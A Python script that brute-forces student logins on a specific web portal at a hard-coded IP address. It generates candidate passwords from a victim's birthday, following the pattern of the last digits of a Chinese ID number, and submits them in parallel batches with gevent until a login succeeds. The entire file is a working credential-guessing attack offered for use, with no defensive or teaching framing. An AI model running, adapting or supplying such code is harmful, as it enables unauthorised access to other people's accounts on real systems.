#!/usr/bin/env python
# -*- coding: utf-8 -*-


import time
from string import Template
import itertools

import gevent
from gevent.monkey import patch_socket

patch_socket()

import requests

from bs4 import BeautifulSoup


def find_hidden_inputs(html):
    """Returns input elements whose type are hidden.
    """
    return BeautifulSoup(html).find_all('input', {'type': 'hidden'})


def _extract_id_and_value_from_hidden_input(input_element):
    return input_element['id'], input_element['value']


class WebsiteApi(object):

    def home_page(self):
        """Opens the home page of the website.
        """
        pass

    def login(self, username, password):
        """Logs in the user to the website.
        """
        pass


class PrpWebsiteApi(WebsiteApi):

    HOME_PAGE = LOGIN_URL = 'http://202.120.35.20/ppa/defaultpractice.aspx'
    USER_HOME = 'http://202.120.35.20/ppa/Main/MainPractice.htm'

    def __init__(self):
        WebsiteApi.__init__(self)

    def __was_login_successful(self, final_url):
        return final_url == self.USER_HOME

    def home_page(self):
        return requests.get(self.HOME_PAGE)

    def login(self, username, password):
        data = {
            'txtID': username,
            'txtPass': password,
            'check': 'radStudent',
            'btnLogin': '登陆'
        }

        html = self.home_page().text
        inputs = find_hidden_inputs(html)
        for ele in inputs:
            id_, value = _extract_id_and_value_from_hidden_input(ele)
            data[id_] = value

        final_url = requests.post(self.LOGIN_URL, data=data).url

        return self.__was_login_successful(final_url)


class Birthday(object):

    def __init__(self, birthday_in_str):
        if not Birthday.validate(birthday_in_str):
            raise ValueError('birthday is invalid')

        has_four_digits = len(birthday_in_str) == 4
        if has_four_digits:
            self._year = None
            self._month = int(birthday_in_str[:2])
            self._day = int(birthday_in_str[2:])

        else:
            self._year = int(birthday_in_str[:4])
            self._month = int(birthday_in_str[4:6])
            self._day = int(birthday_in_str[6:])

    @staticmethod
    def validate(birthday_in_str):
        """Checks birthday_in_str is valid.
        """
        if not birthday_in_str.isdigit():
            return False

        if not len(birthday_in_str) in (4, 8):
            return False

        return True

    @property
    def year(self):
        return self._year

    @property
    def month(self):
        return self._month

    @property
    def day(self):
        return self._day


class PasswordDictionary(object):

    def __iter__(self):
        return self

    def next(self):
        pass


class IdNumberDictionary(PasswordDictionary):

    _TEMPLATE = None
    _NDIGITS = None

    def __init__(self, birthday_in_str):
        PasswordDictionary.__init__(self)
        self._birthday = Birthday(birthday_in_str)
        self._guess = 0

    def next(self):
        if self._guess < int(10**self._NDIGITS):
            password = self._TEMPLATE.safe_substitute(
                month=str(self._birthday.month).zfill(2),
                day=str(self._birthday.day).zfill(2),
                guess=str(self._guess).zfill(self._NDIGITS)
            )
            self._guess += 1
            return password

        else:
            raise StopIteration()


class IdNumberWithX(IdNumberDictionary):

    _TEMPLATE = Template('$month$day${guess}X')
    _NDIGITS = 3


class IdNumberWithoutX(IdNumberDictionary):

    _TEMPLATE = Template('$month$day$guess')
    _NDIGITS = 4


class AttackStrategy(object):

    def execute(self, api, username, guesses):
        pass


class ParallelAttack(AttackStrategy):

    def __init__(self, n_every_batch=10, sleep_time=5):
        self.__n_every_batch = n_every_batch
        self.__sleep_time = sleep_time

    def execute(self, api, username, guesses):
        successful_password = None
        end = False
        logged_in = False

        while not (end or logged_in):
            passwords = list(itertools.islice(guesses, self.__n_every_batch))

            if len(passwords) < self.__n_every_batch:
                end = True

            if passwords:
                threads = []
                for password in passwords:
                    thread = gevent.spawn(api.login, username, password)
                    threads.append(thread)
                gevent.joinall(threads)

                for i, thread in enumerate(threads):
                    if thread.value:
                        logged_in = True
                        successful_password = passwords[i]

                if not (end or logged_in):
                    time.sleep(self.__sleep_time)

        return successful_password


class AttackWorker(object):

    def __init__(self, website_api, username,
                 attack_strategy, password_dicts=()):
        self.__website_api = website_api
        self.__username = username
        self.__attack_strategy = attack_strategy
        self.__password_dicts = list(password_dicts)

    def _guesses(self):
        for d in self.__password_dicts:
            for p in d:
                yield p

    def load_password_dicts(self, dicts):
        for d in dicts:
            self.__password_dicts.append(d)

    def start(self):
        successful_password = self.__attack_strategy.execute(
            self.__website_api,
            self.__username,
            self._guesses()
        )

        if successful_password:
            print('password is %s' % successful_password)
        else:
            print('attack failed')


def main():
    api = PrpWebsiteApi()
    username = ''
    birthday = ''
    attack_strategy = ParallelAttack()
    dicts = [
        IdNumberWithX(birthday),
        IdNumberWithoutX(birthday)
    ]
    worker = AttackWorker(api, username, attack_strategy)
    worker.load_password_dicts(dicts)
    worker.start()


if __name__ == '__main__':
    main()
